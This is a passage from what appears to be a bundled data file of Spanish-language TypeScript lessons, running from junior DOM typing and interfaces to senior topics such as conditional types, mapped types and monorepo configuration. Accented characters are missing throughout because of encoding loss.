};
\`\`\`

Con \`type\` se puede hacer algo parecido con intersecciones (\`&\`), pero \`interface extends\` es ms natural y performante.

## 3. Cundo usar Type vs Interface?

*   **Interface:** Para objetos, modelos de datos, props de componentes React, y cosas que quieras extender.
*   **Type:** Para Uniones (\`string | number\`), Primitivos, Tuplas, o alias simples.

**Regla de dedo:** Usa \`interface\` hasta que necesites ss o s una funcionalidad de \`type\` (como uniones).

## 4. Ejercicio
1.  Crea una interface \`Vehiculo\` con \`marca\` y \`modelo\`.
2.  Crea una interface \`Auto\` que extienda de \`Vehiculo\` y agregue \`puertas\` (number).
3.  Crea un objeto \`miAuto\` de tipo \`Auto\`.
`,completed:!1},{id:"ts-junior-dom-types",title:"Tipado del DOM",level:"junior",content:`# Leccin 10: Tipado del DOM

## 1. El DOM y TypeScript

Cuando seleccionas elementos del DOM, TS no sabe qu HTML hay en tu pgina.
Por defecto, devuelve \`HTMLElement | null\` (o tipos genricos).

\`\`\`typescript
const input = document.getElementById("mi-input");
// Tipo inferido: HTMLElement | null

// Error: Property 'value' does not exist on type 'HTMLElement'.
console.log(input.value); 
\`\`\`
Un \`HTMLElement\` genrico no tiene \`.value\` (un div no tiene value). Un \`HTMLInputElement\` s.

## 2. Type Assertion (Casting) con \`as\`

Debemos decirle a TS: "Confa en m, yo s que este ID pertenece a un Input".

\`\`\`typescript
const input = document.getElementById("mi-input") as HTMLInputElement;

// Ahora s
console.log(input.value);
\`\`\`

## 3. Manejo de \`null\`

\`document.getElementById\` retorna \`null\` si no encuentra el elemento.
Si usas \`as\`, le mientes a TS diciendo que SIEMPRE estar ah. Si no est, tu JS explotar en tiempo de ejecucin (\`Cannot read property 'value' of null\`).

**Forma Segura:**

\`\`\`typescript
const input = document.getElementById("mi-input") as HTMLInputElement | null;

if (input) {
    console.log(input.value); // Seguro
}
\`\`\`

## 4. Tipos comunes de Elementos
*   \`HTMLInputElement\` (inputs)
*   \`HTMLButtonElement\` (botones)
*   \`HTMLDivElement\` (divs)
*   \`HTMLFormElement\` (formularios)
*   \`HTMLAnchorElement\` (links <a>)

## 5. Ejercicio
Crea un form en HTML con un input y un botn.
Seleccinalos en TS.
Al hacer click en el botn, lee el valor del input y mustralo en console.log.
Asegrate de manejar el tipo correcto del input.
`,completed:!1},{id:"ts-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

## 1. No uses \`any\`
Es tentador cuando TS se pone "pesado", pero usar \`any\` derrota el propsito de usar TS.
Si no sabes el tipo, intenta investigar o usa \`unknown\` (que te obliga a chequear antes de usar).

## 2. Deja que TS infiera (KISS)
Keep It Simple, Stupid.
No escribas cdigo redundante.

\`\`\`typescript
// Mal (demasiado ruido)
const nombre: string = "Juan";

// Bien
const nombre = "Juan";
\`\`\`
Solo anota tipos en parmetros de funciones, retornos complejos y definiciones vacas.

## 3. Strict Mode
Asegrate de tener \`"strict": true\` en tu \`tsconfig.json\`.
Esto habilita todas las reglas de seguridad (no implict any, null checks, etc). Aprender TS sin modo estricto es aprender malos hbitos.

## 4. Nombres Claros para Interfaces/Types
Usa PascalCase.
*   \`User\`, \`ProductItem\`, \`ApiResponse\`.
*   Evita prefijos hngaros como \`IUser\` (esa prctica es de C# antiguo, en TS moderno se desaconseja).

## 5. Organiza tus Tipos
Si tu proyecto crece:
*   Tipos pequeos -> En el mismo archivo que el componente/funcin.
*   Tipos compartidos -> \`types.ts\` o carpeta \`types/\`.

## 6. Desafo Final: Refactor
Toma este cdigo JS inseguro y psalo a TS estricto:

\`\`\`javascript
// JS
function procesar(usuario) {
    console.log("Procesando a " + usuario.nombre);
    return usuario.edad * 2;
}

const u = { nombre: "Ana", edad: 20 };
procesar(u);
\`\`\`

**Misin:** Crea una interface \`Usuario\`, tipa los parmetros y el retorno de la funcin.
`,completed:!1},{id:"ts-junior-ejercicios",title:"Ejercicios Prcticos: TypeScript Junior",level:"junior",content:`# Ejercicios Prcticos: TypeScript Junior

Estos ejercicios estn diseados para cimentar tus conocimientos en tipos primitivos, interfaces, funciones y manipulacin del DOM tipada.

**Instrucciones:**
1.  Crea un archivo \`.ts\` para cada ejercicio.
2.  Si usas VS Code, observa los errores en rojo antes de compilar.
3.  Intenta resolverlos sin usar \`any\`.

---

## Ejercicio 1: Calentamiento (Tipos Bsicos)

**Objetivo:** Tipar variables y argumentos de funcin.

**Consigna:**
Crea una funcin llamada \`calcularPromedio\` que reciba:
*   \`nombre\` (string)
*   \`notas\` (array de nmeros)
*   \`notaAprobacion\` (nmero, opcional, por defecto 6)

La funcin debe devolver un string que diga: "El alumno [nombre] [aprob/reprob] con un promedio de [X]".

**Requisitos:**
*   Tipa explcitamente todos los parmetros y el retorno.
*   Calcula el promedio real del array.

---

## Ejercicio 2: Modelando Datos (Objetos Complejos)

**Objetivo:** Uso de Interfaces y Objetos anidados.

**Consigna:**
Define las interfaces necesarias para modelar un **Carrito de Compras** de un E-commerce.
*   \`Producto\`: id (number), nombre (string), precio (number), categorias (array de strings).
*   \`CarritoItem\`: producto (Producto), cantidad (number).
*   \`Carrito\`: id (string), items (array de CarritoItem), total (number, opcional).

Crea una variable \`miCarrito\` que cumpla con la interfaz \`Carrito\` e incluye al menos 2 productos.

---

## Ejercicio 3: La Lista de Tareas (Arrays y Unin)

**Objetivo:** Menejo de estados y literales.

**Consigna:**
1.  Define un Type \`EstadoTarea\` que solo pueda ser: \`'pendiente' | 'en-proceso' | 'terminada'\`.
2.  Define una Interface \`Tarea\` con: \`id\` (number), \`titulo\` (string), \`estado\` (EstadoTarea).
3.  Crea un array de tareas inicial con 3 elementos.
4.  Crea una funcin \`cambiarEstado(id: number, nuevoEstado: EstadoTarea)\` que busque la tarea en el array y actualice su estado.

**Prueba:** Intenta llamar a \`cambiarEstado(1, 'cancelada')\` y verifica que TS te marque error.

---

## Ejercicio 4: Tipando el DOM (Formulario)

**Objetivo:** Type Assertion y Eventos.

**HTML (Imaginario):**
\`\`\`html
<form id="registro">
  <input type="text" id="username" />
  <input type="email" id="email" />
  <button type="submit">Registrar</button>
</form>
\`\`\`

**Consigna TS:**
1.  Selecciona el formulario y los inputs usando \`document.getElementById\`.
2.  Usa \`as HTML...Element\` para tiparlos correctamente.
3.  Agrega un 'submit' event listener al formulario.
4.  Dentro del listener, previene el default y muestra en consola un objeto con los valores de los inputs. :warning: Cuidado con los valores \`null\` si no encuentras los elementos.

---

## Ejercicio 5: Desafo de Migracin (JS -> TS)

**Objetivo:** Refactorizar cdigo inseguro.

**Cdigo Legacy (JS):**
\`\`\`javascript
function procesarRespuesta(apiResponse) {
    if (apiResponse.status === 'ok') {
        return apiResponse.data.map(item => item.name.toUpperCase());
    } else {
        return false;
    }
}
\`\`\`

**Misin:**
1.  Crea interfaces para la respuesta de la API (\`ApiResponse\`).
    *   Si \`status\` es 'ok', debe tener \`data: { name: string }[]\`.
    *   Si \`status\` es 'error', debe tener \`message: string\`.
    *   (Pista: Usa Discriminated Unions si te animas, o interfaces opcionales).
2.  Tipa la funcin para que devuelva \`string[] | boolean\`.
3.  Asegrate que TS no se queje al acceder a \`data\` o \`message\`.

---

A codear! 
`,completed:!1,isProject:!0},{id:"ts-junior-evaluacion",title:"Evaluacin: TypeScript Junior",level:"junior",content:`# Evaluacin Final: TypeScript Junior

Esta evaluacin valida tu capacidad para trabajar con tipos bsicos, interfaces y funciones de forma segura.

## 1. Examen Terico
*   Cul es la diferencia principal entre \`any\` y \`unknown\`?
*   Qu sucede si intentas asignar un \`string\` a una variable tipada como \`number\` en tiempo de compilacin? Y en tiempo de ejecucin?
*   Explica qu es un "Template Literal Type" de forma sencilla.

## 2. Ejercicio Prctico: El Sistema de Biblioteca
Define las interfaces y tipos necesarios para un sistema de biblioteca:
*   \`Autor\`: nombre, nacionalidad.
*   \`Libro\`: id (nmero), ttulo, autor (Autor), disponible (booleano).
*   Crea una funcin \`prestarLibro(libro: Libro)\` que cambie el estado de disponibilidad y devuelva el libro actualizado.

## 3. Desafo Real: Validador de Formulario
Crea una funcin llamada \`validarCampo\` que reciba un valor (string) y un tipo de validacin ('email' | 'password').
*   Si es 'email', debe contener un '@'.
*   Si es 'password', debe tener al menos 8 caracteres.
*   La funcin debe devolver un objeto: \`{ valido: boolean, error?: string }\`.

## 4. Criterios de Aprobacin
* [ ] No uso de \`any\`.
* [ ] Tipado correcto de parmetros y retornos.
* [ ] Uso de interfaces para objetos complejos.
* [ ] Cdigo libre de errores de sintaxis TS.
`,completed:!1,isProject:!0},{id:"ts-semi-senior-interfaces-vs-types",title:"Interfaces vs Types (Duelo de Gigantes)",level:"semi-senior",content:`# Leccin 12: Interfaces vs Types (Duelo de Gigantes)

Como Semi-Senior, ya no puedes decir "son casi lo mismo". Hay diferencias arquitectnicas que definen cmo escalar tu cdigo.

## 1. La Diferencia Tcnica: Declaration Merging
Las **Interfaces** pueden ser definidas varias veces y TS las unir automticamente. Los **Types** no.

### El Caso Correcto (Interfaces para Libreras):
\`\`\`typescript
interface User {
  name: string;
}

// En otro archivo...
interface User {
  role: 'admin' | 'user';
}

const me: User = { name: 'Octavio', role: 'admin' }; // OK - Se fusionaron
\`\`\`

### El Caso donde Gana Type (Uniones e Intersecciones):
Un type puede ser una unin de tipos, algo que una interfaz no puede modelar directamente.

\`\`\`typescript
type Status = 'loading' | 'success' | 'error';
type ID = string | number;
\`\`\`

## 2. Cul elegir? (Regla del Mentor)

- **USA INTERFACES** para definir la forma de los objetos, especialmente si van a ser extendidos o si ests exponiendo una API/Librera.
- **USA TYPES** para tipos de unin, tuplas, tipos primitivos complejos o cuando necesites usar utilidades de tipos avanzadas.

## 3. Comparacin: Extender vs Intersectar

### Incorrecto (Abuso de Interseccin):
\`\`\`typescript
type Animable = { animate: () => void };
type Visible = { show: () => void };
type UIElement = Animable & Visible & { id: string };
\`\`\`

### Correcto (Legibilidad con Extends):
\`\`\`typescript
interface UIElement extends Animable, Visible {
  id: string;
}
\`\`\`
*Tip:* Las interfaces suelen dar mejores mensajes de error y mejor performance en el compilador.

## 4. Ejercicio
Refactoriza un conjunto de tipos de unin para que usen un \`type\` y una estructura de datos de respuesta de API que use una \`interface\`.
`,completed:!1},{id:"ts-semi-senior-generics",title:"Generics (Cdigo Flexible y Seguro)",level:"semi-senior",content:`# Leccin 13: Generics (Cdigo Flexible y Seguro)

Los Generics son la herramienta principal para crear cdigo reutilizable sin caer en el temido \`any\`.

## 1. El Concepto: "Variables de Tipo"
Imagina una funcin que devuelve el primer elemento de un array.

### Mal (Any):
\`\`\`typescript
function getFirst(arr: any[]): any {
  return arr[0];
}
const val = getFirst([1, 2, 3]); // val es 'any', perdiste el tipado.
\`\`\`

### Bien (Generics):
\`\`\`typescript
function getFirst<T>(arr: T[]): T {
  return arr[0];
}
const val = getFirst([1, 2, 3]); // val es 'number'. TS lo infiri.
\`\`\`

## 2. Restricciones (Constraints)
A veces no quieres que \`T\` sea "cualquier cosa", sino que tenga ciertas propiedades.

\`\`\`typescript
interface HasId {
  id: string | number;
}

function logEntityId<T extends HasId>(entity: T) {
  console.log(entity.id); // OK, T garantiza tener 'id'
}
\`\`\`

## 3. Interfaces Genricas
Ideales para respuestas de API.

\`\`\`typescript
interface ApiResponse<Data> {
  status: number;
  data: Data;
  error?: string;
}

type UserResponse = ApiResponse<{ name: string; email: string }>;
\`\`\`

## 4. Ejercicio
Crea una clase genrica \`Storage<T>\` que tenga un mtodo \`add(item: T)\` y un mtodo \`getAll(): T[]\`.
Asegrate de que solo acepte objetos que tengan una propiedad \`createdAt: Date\`.
`,completed:!1},{id:"ts-semi-senior-enums-literals",title:"Enums vs Literal Unions (El Dilema)",level:"semi-senior",content:`# Leccin 14: Enums vs Literal Unions (El Dilema)

Como Semi-Senior, debes saber que los \`enums\` en TS generan cdigo en JS, a diferencia de la mayora de las caractersticas de TS.

## 1. El Problema de los Enums Numricos
Por defecto, los enums son numricos y son bidireccionales, lo que puede causar bugs silenciosos.

\`\`\`typescript
enum Direction { Up, Down }
console.log(Direction[0]); // "Up" - Realmente quieres acceso inverso por ndice?
\`\`\`

## 2. La Alternativa Pro: Const enums o String Unions
Para performance y limpieza, los String Literal Unions son los favoritos de la comunidad.

### Opcin A: String Literal Union (Recomendado)
\`\`\`typescript
type Role = 'ADMIN' | 'USER' | 'GUEST';

function setRole(role: Role) { ... }
\`\`\`

### Opcin B: Const Enum (Si necesitas legibilidad de objeto)
\`\`\`typescript
const enum Status {
  Active = 'ACTIVE',
  Inactive = 'INACTIVE'
}
\`\`\`
*Ventaja:* \`const enum\` no deja rastro en el JS final, se reemplaza por los valores literales.

## 3. Cundo usar cada uno?
- Usa **String Unions** para estados simples y props de componentes.
- Usa **Objects with as const** si necesitas iterar sobre las llaves en tiempo de ejecucin.

## 4. Ejercicio
Migra un sistema de "Prioridades" (1, 2, 3) a un sistema de String Literal Union ('LOW', 'MEDIUM', 'HIGH'). Explica por qu es ms mantenible.
`,completed:!1},{id:"ts-semi-senior-readonly-optional",title:"Readonly y Optional (Inmutabilidad y Flexibilidad)",level:"semi-senior",content:`# Leccin 15: Readonly y Optional (Inmutabilidad y Flexibilidad)

El control de acceso a las propiedades previene bugs de mutacin accidental.

## 1. Readonly: Blindando las propiedades
Indicas que una propiedad no puede ser reasignada despus de su creacin.

\`\`\`typescript
interface Config {
  readonly apiKey: string;
  readonly endpoint: string;
}

const conf: Config = { apiKey: '123', endpoint: '/api' };
conf.apiKey = '456'; // Error: Cannot assign to 'apiKey' because it is a read-only property.
\`\`\`

## 2. ReadonlyArray
Para evitar que alguien haga un \`.push()\` o \`.splice()\` en tus listas.

\`\`\`typescript
const numbers: ReadonlyArray<number> = [1, 2, 3];
numbers.push(4); // Error: Property 'push' does not exist on type 'readonly number[]'.
\`\`\`

## 3. Propiedades Opcionales (?): Manejo Seguro
Un Senior nunca asume que una propiedad opcional est ah sin chequearla.

### Mal (Acceso inseguro):
\`\`\`typescript
function printAge(user: { age?: number }) {
  console.log(user.age.toFixed()); // Runtime Error si es undefined
}
\`\`\`

### Bien (Optional Chaining):
\`\`\`typescript
function printAge(user: { age?: number }) {
  console.log(user.age?.toFixed()); 
}
\`\`\`

## 4. Ejercicio
Crea una interfaz \`AppState\` con propiedades \`readonly\` y un mtodo que intente mutarlas. Observa cmo TS te protege.
`,completed:!1},{id:"ts-semi-senior-type-guards",title:"Narrowing y Type Guards (Domando la Incertidumbre)",level:"semi-senior",content:`# Leccin 16: Narrowing y Type Guards (Domando la Incertidumbre)

Narrowing es el proceso en el que TS reduce un tipo amplio (ej: \`string | number\`) a uno especfico.

## 1. Type Guards Nativos
Usa \`typeof\` para primitivos e \`instanceof\` para clases.

\`\`\`typescript
function process(val: string | number) {
  if (typeof val === 'string') {
    return val.toUpperCase(); // TS ya sabe que es string
  }
}
\`\`\`

## 2. User-Defined Type Guards (El Operador \`is\`)
A veces necesitas lgica personalizada para saber si un objeto es de un tipo.

### Caso Real:
\`\`\`typescript
interface Bird { fly: () => void }
interface Fish { swim: () => void }

// Type Guard personalizado
function isFish(pet: Bird | Fish): pet is Fish {
  return (pet as Fish).swim !== undefined;
}

function move(pet: Bird | Fish) {
  if (isFish(pet)) {
    pet.swim(); // OK
  } else {
    pet.fly(); // OK
  }
}
\`\`\`

## 3. El operador \`in\`
Ideal para objetos literales o interfaces.

\`\`\`typescript
function processEvent(event: MouseEvent | KeyboardEvent) {
  if ('key' in event) {
    console.log(event.key); // Es KeyboardEvent
  }
}
\`\`\`

## 4. Ejercicio
Crea un sistema que reciba "Notificaciones". La notificacin puede ser \`Email\` o \`SMS\`. Cada una tiene propiedades distintas. Crea un Type Guard para distinguirlas sin usar \`any\`.
`,completed:!1},{id:"ts-semi-senior-utility-types",title:"Utility Types (El Kit de Herramientas)",level:"semi-senior",content:"# Leccin 17: Utility Types (El Kit de Herramientas)\n\nTS trae herramientas integradas para transformar tipos. Un Semi-Senior las usa a diario.\n\n## 1. `Partial<T>` y `Required<T>`\nConvierte todas las propiedades en opcionales u obligatorias.\n\n```typescript\ninterface User { id: number; name: string; email: string }\n\n// Ideal para funciones de actualizacin (PATCH)\nfunction updateUser(id: number, fields: Partial<User>) {\n  // fields puede tener solo 'name', o solo 'email', etc.\n}\n```\n\n## 2. `Pick<T, Keys>` y `Omit<T, Keys>`\nSelecciona o descarta propiedades.\n\n```typescript\ntype UserPreview = Pick<User, 'id' | 'name'>;\ntype UserWithoutEmail = Omit<User, 'email'>;\n```\n\n## 3. `Record<Keys, Type>`\nIdeal para diccionarios o mapas de objetos.\n\n```typescript\nconst usersById: Record<number, User> = {\n  1: { id: 1, name: 'Ana', email: '...' },\n  2: { id: 2, name: 'Beto', email: '...' }\n};\n```\n\n## 4. `Readonly<T>`\nConvierte todo el objeto en inmutable de un solo golpe.\n\n## 5. Ejercicio\nTienes un objeto `Config` gigante. Crea un tipo `UserConfig` que tome `Config`, pero le quite las propiedades de base de datos (`host`, `port`) y haga que el resto sean opcionales.\n",completed:!1},{id:"ts-semi-senior-tsconfig",title:"tsconfig y Estrategias de Compilacin",level:"semi-senior",content:'# Leccin 18: tsconfig y Estrategias de Compilacin\n\nConfigurar bien tu proyecto es la diferencia entre un cdigo seguro y uno que "parece" TypeScript pero tiene bugs.\n\n## 1. Las llaves sagradas de `strict`\nEstar en `strict: true` enciende:\n- `noImplicitAny`: No permite `any` accidental.\n- `strictNullChecks`: Te obliga a manejar el `null` y `undefined`.\n- `strictFunctionTypes`: Valida firmas de funciones con rigor.\n\n## 2. Resolviendo Paths (`paths`)\nEvita los imports relativos infinitos: `import { x } from \'../../../../components/x\'`.\n\n```json\n{\n  "compilerOptions": {\n    "baseUrl": ".",\n    "paths": {\n      "@components/*": ["src/components/*"],\n      "@hooks/*": ["src/hooks/*"]\n    }\n  }\n}\n```\n\n## 3. `skipLibCheck`\nAcelera la compilacin ignorando los errores de tipos dentro de `node_modules`. (T no puedes arreglar los errores de otros, verdad?).\n\n## 4. `target` vs `lib`\n- **Target:** A qu versin de JS vas a emitir (ej: ESNext, ES6).\n- **Lib:** Qu caractersticas del entorno vas a usar (ej: ["DOM", "ESNext"]).\n\n## 5. Desafo\nInvestiga qu hace `noUnusedLocals` y `noUnusedParameters`. Incorpralos a tu flujo de trabajo para tener un cdigo ms limpio.\n',completed:!1},{id:"ts-semi-senior-arquitectura-tipos",title:"Arquitectura y Organizacin de Tipos",level:"semi-senior",content:`# Leccin 19: Arquitectura y Organizacin de Tipos

Un proyecto Senior no tiene tipos desparramados por todos lados.

## 1. Co-location vs Global Types
- **Co-location:** Si un tipo solo se usa en un componente, gurdalo en el archivo del componente.
- **Shared Types:** Si se usa en 3 o ms lugares, muvelo a un archivo central.

### Estructura Recomendada:
\`\`\`
src/
  types/
    index.ts (barrel file)
    user.types.ts
    api.types.ts
  components/
    UserCard/
      UserCard.tsx
      UserCard.types.ts (Solo para este componente)
\`\`\`

## 2. Barrel Files
Usa \`index.ts\` para exportar todo de una carpeta y facilitar los imports.

\`\`\`typescript
// types/index.ts
export * from './user.types';
export * from './api.types';
\`\`\`

## 3. Evita los Namespaces
Fueron tiles en el pasado, pero hoy en da los **ES Modules** (import/export) son el estndar y funcionan mejor con los bundlers modernos.

## 4. Tipado de Terceros (\`@types\`)
Si una librera no tiene tipos, bscala en **DefinitelyTyped**:
\`npm install -D @types/nombre-libreria\`

## 5. Ejercicio
Organiza los tipos de un pequeo sistema de Blog (Post, Comentario, Autor) usando la estructura sugerida.
`,completed:!1},{id:"ts-semi-senior-ejercicios",title:"Desafo Tcnico Semi-Senior",level:"semi-senior",content:`# Leccin 20: Desafo Tcnico Semi-Senior

Es hora de aplicar todo lo aprendido en un caso de produccin real.

## El Escenario: Generic API Manager
Necesitamos crear una funcin que maneje peticiones a una API de manera genrica, que maneje errores y que devuelva los datos tipados.

**Tu misin es implementar la funcin \`request\`:**

### Requisitos:
1.  Debe ser **Genrica**. T le pasas el tipo de datos que esperas.
2.  Debe aceptar una URL y un objeto de configuracin opcional.
3.  Debe devolver una **Promesa** con una unin: \`Result<T>\`.
4.  Define \`Result<T>\` como un Type que puede ser:
    - Success: \`{ status: 'success', data: T }\`
    - Error: \`{ status: 'error', message: string }\`
5.  Usa un **Type Guard** para verificar si la respuesta fue exitosa antes de usar los datos.

### Esqueleto Inicial:
\`\`\`typescript
type Result<T> = ...

async function request<T>(url: string): Promise<Result<T>> {
  // Implementacin aqu
}

// Ejemplo de uso esperado:
const res = await request<User[]>('/api/users');
if (res.status === 'success') {
  console.log(res.data.length); // OK
}
\`\`\`

---

## Criterios de Aprobacin
- [ ] No usaste \`any\`.
- [ ] Usaste Generics correctamente.
- [ ] El Type Guard funciona y permite el Narrowing.
- [ ] Cdigo limpio y documentado con comentarios.

Buena suerte, desarrollador!
`,completed:!1,isProject:!0},{id:"ts-semi-senior-evaluacion",title:"Evaluacin: TypeScript Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: TypeScript Semi-Senior

Demuestra tu conocimiento en genricos, utilitarios y tcnicas de narrowing para cdigo profesional.

## 1. Examen Terico
*   Cundo preferiras usar un \`type\` sobre una \`interface\`? Menciona al menos dos casos.
*   Explica qu hace el operador \`is\` en la firma de una funcin.
*   Qu ventaja tiene \`ReadonlyArray<T>\` sobre un array normal?

## 2. Ejercicio Prctico: Wrapper de API Genrico
Crea una funcin llamada \`fetchData<T>(url: string)\` que:
1. Realice un \`fetch\` a la URL.
2. Devuelva los datos tipados como \`T\`.
3. Maneje errores y los devuelva en un formato consistente.

## 3. Desafo Real: El Filtro Inteligente
Tienes una lista de usuarios con diferentes roles ('admin', 'editor', 'viewer').
Crea una funcin genrica \`filtrarPorPropiedad<T, K extends keyof T>(lista: T[], llave: K, valor: T[K])\` que devuelva los elementos filtrados.
*   Asegrate de que la "llave" solo pueda ser una propiedad existente del objeto.

## 4. Criterios de Aprobacin
* [ ] Implementacin exitosa de Generics.
* [ ] Uso correcto de Type Constraints (\`extends keyof\`).
* [ ] Manejo de inmutabilidad donde sea necesario.
* [ ] Cdigo altamente reutilizable y flexible.
`,completed:!1,isProject:!0},{id:"ts-senior-advanced-generics",title:"Advanced Generics & Constraints",level:"senior",content:`# Leccin 21: Advanced Generics & Constraints

En el nivel Senior, los genricos no solo sirven para reutilizar funciones, sino para crear **contratos de tipos dinmicos** que se adaptan a la entrada del desarrollador.

## 1. Genricos de Rango Mltiple
A menudo necesitamos que un tipo genrico interacte con otro.

\`\`\`typescript
function merge<T extends object, U extends object>(objA: T, objB: U): T & U {
  return { ...objA, ...objB };
}
\`\`\`

## 2. El operador \`keyof\`
Fundamental para asegurar que estamos accediendo a propiedades que realmente existen.

\`\`\`typescript
function getProperty<T extends object, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}

const user = { id: 1, name: 'Octavio' };
getProperty(user, 'name'); // OK: retorna string
getProperty(user, 'email'); // Error: 'email' no existe en 'user'
\`\`\`

## 3. Clases Genricas Abstractas
Ideal para definir la base de un servicio que maneja diferentes entidades.

\`\`\`typescript
abstract class BaseService<T> {
  protected items: T[] = [];
  abstract findById(id: string | number): T | undefined;
}
\`\`\`

## 4. Pregunta de Entrevista Senior
**P:** "Cul es la diferencia entre usar \`any\`, \`unknown\` y un genrico \`T\`?"
**R:** \`any\` apaga el compilador. \`unknown\` es un tipo seguro que te obliga a validar antes de usar. Un genrico \`T\` **conserva la identidad del tipo** a travs de la funcin, permitiendo que la salida dependa exactamente de la entrada.

## 5. Desafo
Implementa una funcin \`pluck\` que tome un array de objetos y una llave, y devuelva un array con los valores de esa llave, manteniendo el tipado exacto del valor.
`,completed:!1},{id:"ts-senior-conditional-types",title:"Conditional Types & Infer",level:"senior",content:`# Leccin 22: Conditional Types & Infer

Los tipos condicionales permiten que la lgica de programacin entre al sistema de tipos.

## 1. Sintaxis Ternaria de Tipos
\`SomeType extends OtherType ? TrueType : FalseType\`

\`\`\`typescript
type IsString<T> = T extends string ? true : false;

type A = IsString<"hola">; // true
type B = IsString<42>;     // false
\`\`\`

## 2. El poder de \`infer\`
\`infer\` permite declarar una variable de tipo dentro de una condicin para "extraer" informacin.

### Caso Real: Extraer el tipo de retorno de una funcin
\`\`\`typescript
type GetReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

function greeting() { return "Hello!"; }
type GreetingReturn = GetReturnType<typeof greeting>; // string
\`\`\`

## 3. Distribucin de Tipos Condicionales
Cuando pasas una unin a un tipo condicional, TS lo aplica a cada miembro de la unin.

\`\`\`typescript
type ToArray<T> = T extends any ? T[] : never;
type StringOrNumberArray = ToArray<string | number>; // string[] | number[]
\`\`\`

## 4. Caso de Produccin: API Error Handling
Imagina un tipo que extrae el tipo de los datos solo si la respuesta de la API no es un error.

\`\`\`typescript
type UnpackResponse<T> = T extends { data: infer D } ? D : T;
\`\`\`

## 5. Desafo Tcnico
Crea un tipo \`DeepNonNullable<T>\` que elimine \`null\` y \`undefined\` de todas las propiedades de un objeto, incluso en objetos anidados.
`,completed:!1},{id:"ts-senior-mapped-types",title:"Mapped Types & Template Literals",level:"senior",content:`# Leccin 23: Mapped Types & Template Literals

Los Mapped Types permiten transformar un tipo existente en uno nuevo, propiedad por propiedad.

## 1. Sintaxis Bsica
\`\`\`typescript
type ReadonlyUser<T> = {
  readonly [P in keyof T]: T[P];
};
\`\`\`

## 2. Mapeo con Remapeo de Llaves (\`as\`)
Podemos prefijar o transformar los nombres de las propiedades.

\`\`\`typescript
interface User {
  id: number;
  name: string;
}

type Getters<T> = {
  [K in keyof T as \`get\${Capitalize<K & string>}\`]: () => T[K];
};

type UserGetters = Getters<User>;
/* Genera:
{
  getId: () => number;
  getName: () => string;
} 
*/
\`\`\`

## 3. Template Literal Types
Introducidos en TS 4.1, permiten manipular strings a nivel de tipos.

\`\`\`typescript
type Environment = "prod" | "dev" | "staging";
type Port = 80 | 443 | 3000;

type Url = \`https://\${Environment}.myapp.com:\${Port}\`;
\`\`\`

## 4. Caso Real: Event Emitters Estrictos
\`\`\`typescript
type Events = "click" | "hover" | "scroll";
type Handler = \`on\${Capitalize<Events>}\`; // "onClick" | "onHover" | "onScroll"
\`\`\`

## 5. Desafo
Crea un mapped type que tome una interfaz y haga que todas sus propiedades sean opcionales, excepto las que comiencen con la palabra "id".
`,completed:!1},{id:"ts-senior-api-library-typing",title:"Tipado Avanzado de APIs y Libreras",level:"senior",content:`# Leccin 24: Tipado Avanzado de APIs y Libreras

Disear tipos para el consumo de otros desarrolladores requiere un enfoque de "Cero Friccin".

## 1. Discriminated Unions (Pattern Matching)
Es el estndar de oro para respuestas de API y estados de UI.

\`\`\`typescript
type ApiResponse<T> = 
  | { status: 'success'; data: T; timestamp: number }
  | { status: 'error'; message: string; code: number }
  | { status: 'loading' };

function handleResponse(res: ApiResponse<User[]>) {
  switch(res.status) {
    case 'success':
      console.log(res.data); // Tipado exacto
      break;
    case 'error':
      console.error(res.message); // Tipado exacto
      break;
  }
}
\`\`\`

## 2. Branded Types (Nominal Typing)
TS es estructural. A veces queremos evitar que se mezclen IDs de diferentes entidades aunque ambos sean \`string\`.

\`\`\`typescript
type UserId = string & { __brand: "UserId" };
type PostId = string & { __brand: "PostId" };

function deleteUser(id: UserId) { ... }

const pid = "123" as PostId;
deleteUser(pid); // Error: PostId no es asignable a UserId
\`\`\`

## 3. Tipado de Terceros: Module Augmentation
Si una librera externa le falta un tipo en una propiedad que t inyectaste.

\`\`\`typescript
import "express-session";

declare module "express-session" {
  interface SessionData {
    user: { id: number; role: string };
  }
}
\`\`\`

## 4. Pregunta de Entrevista
**P:** "Cmo evitas que un programador use \`any\` en una librera que ests exportando?"
**R:** Usando \`unknown\` para datos de entrada de los que no estamos seguros y forzando Type Guards, o usando Generics con restricciones estrictas.

## 5. Caso de Produccin
Un SDK de pagos que debe asegurar que el monto nunca sea negativo y que la moneda sea una de las permitidas por el banco central.
`,completed:!1},{id:"ts-senior-monorepos-production",title:"TypeScript en Monorepos y Arquitectura Escalable",level:"senior",content:`# Leccin 25: TypeScript en Monorepos y Arquitectura Escalable

A medida que el equipo crece, la gestin de tipos entre mltiples paquetes se vuelve crtica.

## 1. Project References (\`tsconfig.json\`)
Permite que un proyecto de TS dependa de otro, compilndolos de forma independiente y eficiente.

\`\`\`json
{
  "compilerOptions": {
    "composite": true,
    "declaration": true
  ,
  "references": [
    { "path": "../common-types" },
    { "path": "../ui-library" }
  ]
}
\`\`\`

## 2. Compartiendo Tipos mediante Paquetes Duales
En arquitecturas Clean/Hexagonal, los tipos (DTOs/Domain Entities) deben vivir en un paquete agnstico que tanto el Frontend como el Backend puedan importar.

## 3. Errores Crticos en Produccin (Case Studies)

### Caso A: El "As Const" Olvidado
En un sistema de routing, se us un array de strings para las rutas permitidas. Al no usar \`as const\`, TS lo infiri como \`string[]\`, permitiendo rutas inexistentes en tiempo de ejecucin.
**Resolucin:** Cambiar a \`const ROUTES = [...] as const;\`.

### Caso B: Serialization Loss
Se enviaron objetos \`Date\` a travs de una API. En el cliente, TS deca que eran \`Date\`, pero JSON los convirti en \`string\`. El frontend crashe al intentar usar \`.getTime()\`.
**Leccin:** Las interfaces de API deben reflejar el transporte (JSON), no el objeto de dominio del lenguaje.

## 4. Prevencin de Regresiones
Usa \`tsd\` o \`dtslint\` en tu CI/CD para testear que tus tipos no se rompan ante cambios accidentales en la arquitectura.

## 5. Desafo Final
Disea la estructura de \`tsconfig\` para un monorepo con un paquete \`core-logic\` (Shared), un \`mobile-app\` (React Native) y un \`web-dashboard\` (Vite).
`,completed:!1},{id:"ts-senior-recursive-types",title:"Recursive Types & Deep Utilities",level:"senior",content:`# Leccin 26: Recursive Types & Deep Utilities

